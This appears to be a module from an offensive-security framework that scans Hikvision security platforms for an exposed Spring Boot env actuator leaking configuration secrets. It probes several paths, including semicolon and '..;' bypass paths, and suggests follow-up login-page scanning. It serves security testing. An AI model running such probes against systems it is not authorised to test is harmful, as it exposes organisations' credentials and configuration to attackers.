#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The HIKVISION comprehensive security management platform has information leakage vulnerabilities, through whic."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Hikvision Springboot Env Actuator - Detect',
        'description': 'The HIKVISION comprehensive security management platform has information leakage vulnerabilities, through which attackers can obtain sensitive information such as environment env for further attacks',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'misconfiguration', 'misconfig', 'hikvision', 'springboot', 'env', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 5,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/HIKVISION/HiKVISION%20%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20env%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md',
            'https://peiqi.wgpsec.org/wiki/iot/HIKVISION/HiKVISION%20综合安防管理平台%20env%20信息泄漏漏洞.html',
        ],
    }

    def run(self):
        for path in ('/artemis/env', '/artemis-portal/artemis/env', '/artemis/actuator/env', '/artemis;/env;', '/artemis/1/..;/env'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            server = r.headers.get("Server") or r.headers.get("server") or ""
            body_any = ('applicationConfig', 'activeProfiles', 'server.port', 'local.server.port',)
            header_any = ('application/json', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json', 'application/vnd.spring-boot.actuator.v2+json', 'application/vnd.spring-boot.actuator.v3+json',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="Hikvision Springboot Env Actuator detected",
                    path=path,
                )
                return True
        return False

